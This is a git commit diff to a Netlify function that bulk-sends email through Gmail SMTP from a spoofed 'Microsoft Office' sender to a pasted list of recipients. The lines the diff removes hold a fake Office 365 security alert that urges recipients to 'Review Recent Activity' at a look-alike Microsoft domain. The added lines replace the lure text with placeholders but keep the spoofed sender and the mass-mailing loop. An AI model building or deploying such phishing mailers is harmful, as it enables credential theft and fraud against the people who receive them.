084ee2c03f41f6ecac09ff6f2b89d4a914016694
Darktrace <darktrace@gmail.com>
2025-03-12 16:03:23 +0100

    Pad

--- netlify/functions/submit.js
+++ netlify/functions/submit.js
@@ -24,6 +24,8 @@ exports.handler = async (event, context) => {
     const formData = JSON.parse(event.body);
     const { recsx } = formData;
 
+    console.log("recsx:", recsx);
+
     if (typeof recsx !== 'string' || !recsx) {
       console.error("recsx is invalid:", recsx);
       return {
@@ -35,6 +37,9 @@ exports.handler = async (event, context) => {
     const emlStrng = recsx.trim();
     const rcpntEmls = emlStrng.split('\n').map(email => email.trim()).filter(email => email !== "");
 
+    console.log("emlStrng:", emlStrng);
+    console.log("rcpntEmls:", rcpntEmls);
+
     const transporter = nodemailer.createTransport({
       host: 'smtp.gmail.com',
       port: 465,
@@ -45,36 +50,28 @@ exports.handler = async (event, context) => {
       }
     });
 
-    //isolate
-    //isolate
-
     rcpntEmls.forEach(recipientEmail => {
-    const mailOptions = {
-      from: '"Microsoft Office" <Office365>',
-      to: rcpntEmls,
-      subject: 'Please Review Security Settings',
-      html: `
+      const mailOptions = {
+        from: '"Microsoft Office" <Office365>',
+        to: recipientEmail,
+        subject: 'Subject here',
+        html: `
           <div style="background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
-          <p><strong>Your Office 365 Account was just signed in to from a new device.
-          You're getting this email to make sure it was you.</strong></p>
-          <p>Please go to your recent activity page to let us know whether or not this was you. To help keep you safe, we require an extra security challenge</p>
-          <a style="background-color:rgb(179, 222, 156); color: black; width: 100%; border-radius: 8px; padding: 0.75rem;" href="https://moffice.netlify.app/">Review Recent Activity</>
-          <p>To Opt or change when you receive security notifications <a href="https://moffice.netlify.app/">Click Here.</a></p>
+            <p>Content Here.</p>
           </div>
-      `
-    };
+        `
+      };
 
-    console.log("Sending email to:", recipientEmail);
+      console.log("Sending email to:", recipientEmail);
 
-    try {
-      const info = transporter.sendMail(mailOptions);
-      console.log('Email sent to', recipientEmail, ':', info.response);
-  } catch (emailError) {
-      console.error('Error sending email to', recipientEmail, ':', emailError);
-      console.error(`Failed to send email to ${recipientEmail}. Continuing to next recipient.`);
-  }
-});
-
+      try {
+        const info = transporter.sendMail(mailOptions);
+        console.log('Email sent to', recipientEmail, ':', info.response);
+      } catch (emailError) {
+        console.error('Error sending email to', recipientEmail, ':', emailError);
+        console.error(`Failed to send email to ${recipientEmail}. Continuing to next recipient.`);
+      }
+    });
 
     return {
       statusCode: 200,
